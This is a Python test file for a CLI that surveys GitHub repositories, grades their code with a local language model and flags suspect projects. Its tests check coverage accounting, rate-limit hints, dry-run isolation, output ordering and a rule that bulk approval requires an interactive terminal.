    transport = _GitHubTransport([_tree_entry("image.png", 10), _tree_entry("notes.txt", 10)], {})

    # When: source selection and the pipeline both run.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=lambda _: fetched,
        grader=_Grader(),
    )

    # Then: zero files were ever read. Nothing was eligible either, so
    # `complete_for_policy` is vacuously true here -- caps truncated nothing,
    # because the extension allow-list itself found nothing to scan; that is
    # a different fact from "clean," which is why the run still must not
    # read as one.
    assert fetched.files == ()
    assert fetched.coverage.discovered_files == 2
    assert fetched.coverage.eligible_files == 0
    assert fetched.coverage.scanned_files == 0
    assert len(fetched.coverage.skipped_policy) == 2
    # ...and the reviewed candidate does not read as a clean pass: zero
    # findings, but a severity distinct from a genuinely clean "none", and no
    # grade was produced from an empty digest.
    entry = result.reviewed[0]
    assert entry.findings == ()
    assert entry.severity != "none"
    assert entry.severity == "unknown"
    assert entry.grade is None


def test_rate_limited_run_suggests_a_token_only_when_one_is_unset(monkeypatch) -> None:
    # Given: search succeeds but source collection reaches an exhausted quota.
    response = json.dumps({"items": [{"full_name": "org/repo", "html_url": "https://github.com/org/repo"}]}).encode()
    headers = {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "2000000000"}
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    errors = io.StringIO()
    # When: an unauthenticated run stops for the exhausted quota.
    assert main(["run", "--query", "example"], transport=_ScriptedTransport([(200, {}, response), (403, headers, b""), (200, {}, b"[]"), (200, {}, b"[]"), (200, {}, b"")]), grader=_Grader(), stderr=errors) == 2
    # Then: it gets the one actionable next step.
    assert "set GITHUB_TOKEN" in errors.getvalue()

    monkeypatch.setenv("GITHUB_TOKEN", "set")
    errors = io.StringIO()
    assert main(["run", "--query", "example"], transport=_ScriptedTransport([(200, {}, response), (200, {}, b"[]"), (200, {}, b"[]"), (200, {}, b""), (403, headers, b"")]), grader=_Grader(), stderr=errors) == 2
    assert "set GITHUB_TOKEN" not in errors.getvalue()


def test_pipeline_withholds_a_candidate_when_every_file_was_skipped() -> None:
    # Given: source selection deliberately yields no readable files.
    grader = _Grader()
    # When: the pipeline sees an empty, explained fetch result.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=lambda _: FetchedFiles((), ("image.png: extension is not gradeable",)),
        grader=grader,
    )
    # Then: the candidate is withheld rather than grading an empty digest.
    assert result.reviewed[0].grade is None
    assert "no readable source files" in (result.reviewed[0].withheld or "")
    assert grader.seen == []


def test_grade_timeout_defaults_to_a_32b_compatible_budget_and_accepts_an_override() -> None:
    # Given: operators may need more or less time for their local model.
    parser = cli._parser()
    # When: they use the default or pass a specific timeout.
    default = parser.parse_args(["run", "--query", "example"])
    override = parser.parse_args(["run", "--query", "example", "--grade-timeout", "240"])
    # Then: the default is practical and the CLI preserves an explicit value.
    assert default.grade_timeout == 120
    assert override.grade_timeout == 240


def test_grade_timeout_is_passed_to_the_ollama_transport(monkeypatch) -> None:
    # Given: the command uses injected collection and source seams but its normal local grader.
    constructed: list[int] = []

    class OllamaTransport:
        def __init__(self, token=None, timeout=30) -> None:
            constructed.append(timeout)

        def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
            return 200, {}, json.dumps({"models": [{"name": "qwen2.5-coder:32b"}]}).encode()

        def request(self, method: str, url: str, data=None, extra_headers=None) -> tuple[int, dict[str, str], bytes]:
            prompt = json.loads(data)["prompt"]
            response = {"malicious": "base64.b64decode" in prompt} if "boolean malicious" in prompt else {"idea": 7, "skill": 6, "description": "d"}
            return 200, {}, json.dumps({"response": json.dumps(response)}).encode()

    monkeypatch.setattr(cli, "UrllibTransport", OllamaTransport)
    # When: the operator changes the grade timeout.
    exit_code = main(
        ["run", "--query", "example", "--grade-timeout", "240"],
        transport=_NoWriteTransport(),
        fetch_files=lambda _: FetchedFiles((("main.py", "x = 1\n"),)),
    )
    # Then: only the model transport receives that configured timeout.
    assert exit_code == 0
    assert constructed == [240]


def test_dry_run_never_asks_for_approval_or_constructs_a_live_transport(capsys) -> None:
    # Given: all live seams raise if the dry-run path touches them.
    transport = _NoWriteTransport()
    # When: a caller injects offline seams and leaves dry-run enabled.
    exit_code = main(
        ["run", "--query", "example"],
        transport=transport,
        fetch_files=lambda _: [("main.py", "x = 1\n")],
        grader=_Grader(),
        writer=transport,
        stdin=io.StringIO("s\n"),
    )
    # Then: no approval prompt or writer call occurs.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "[s]tar" not in captured.out


def test_fixture_dry_run_never_constructs_the_live_transport(monkeypatch, capsys) -> None:
    def forbidden_transport(*args, **kwargs):
        raise AssertionError("fixture replay constructed a live transport")

    monkeypatch.setattr(cli, "UrllibTransport", forbidden_transport)
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES)])
    assert exit_code == 0
    assert "fixture/clean" in capsys.readouterr().out


def test_json_includes_every_candidate_and_its_withheld_reason(capsys) -> None:
    # Given: fixture output contains both a graded and blocked candidate.
    # When: JSON rendering is selected.
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES), "--json"])
    # Then: callers can distinguish a missing score from an omitted record.
    records = json.loads(capsys.readouterr().out)
    assert exit_code == 0
    assert [record["repo"] for record in records] == ["fixture/clean", "fixture/second", "fixture/malicious"]
    assert next(record for record in records if record["repo"] == "fixture/malicious")["withheld"]


def test_radar_and_both_approval_queues_use_the_same_deterministic_order(monkeypatch) -> None:
    # Given: deterministic metadata ranks a first, while the model ranks b first.
    first = Candidate("org/a", "org", "", 0, "")
    second = Candidate("org/b", "org", "", 0, "")

    class Repository:
        def search(self, query: str, limit: int) -> CollectResult:
            return CollectResult(candidates=[second, first])

        def metadata(self, candidate: Candidate, at) -> RepositoryMetadata:
            values = ScoreInputs(True, False, False) if candidate is first else ScoreInputs(False, True, False)
            return RepositoryMetadata(values)

    class Files:
        def read(self, candidate: Candidate) -> FetchedFiles:
            return FetchedFiles((("main.py", "x = 1\n"),))

    class Grader:
        def evaluate(self, digest: str) -> GradeResult:
            return GradeResult(
                idea=1 if "org/a" in digest else 9,
                skill=1 if "org/a" in digest else 9,
                description="d",
                model="test",
                temperature=0.0,
                prompt_version="v1",
            )

        def flags_malicious(self, digest: str) -> bool:
            return False

    class Clock:
        def now(self):
            from datetime import datetime, timezone

            return datetime(2026, 7, 28, tzinfo=timezone.utc)

    artifact = execute(
        RunRequest("example", 2),
        RunPorts(Repository(), Files(), Grader(), Clock()),
        model_smoke=SmokeResult(True, "test"),
    )

    # When: the radar, interactive queue, and bulk queue receive the same review items.
    items = cli.rank_review_items(artifact)
    radar = cli._radar_records(artifact)
    interactive_targets: list[str] = []
    bulk_targets: list[str] = []

    def stop_after_first(target, summary, **kwargs):
        interactive_targets.append(target)
        return None

    def capture_bulk(targets, listing, **kwargs):
        bulk_targets.extend(targets)
        return []

    monkeypatch.setattr(cli, "collect_approval", stop_after_first)
    cli._approvals(items, False, io.StringIO(), io.StringIO())
    monkeypatch.setattr(cli, "collect_bulk_approval", capture_bulk)
    cli._approvals(items, True, io.StringIO(), io.StringIO())

    # Then: the old model-score disagreement cannot reorder an approval target.
    expected = ["org/a", "org/b"]
    assert [row["repo"] for row in radar] == expected
    assert interactive_targets == [expected[0]]
    assert bulk_targets == expected


def test_bulk_approval_refuses_non_interactive_stdin(tmp_path, capsys) -> None:
    # Given: a complete offline run but no terminal for a human decision.
    _write_fixture(tmp_path)
    # When: bulk approval is requested after deliberately disabling dry-run.
    exit_code = main(
        ["run", "--query", "example", "--fixtures", str(tmp_path), "--no-dry-run", "--approve-all"],
        stdin=io.StringIO("s\n"),
    )
    # Then: piping consent cannot authorize actions.
    captured = capsys.readouterr()
    assert exit_code != 0
    assert "터미널" in captured.err
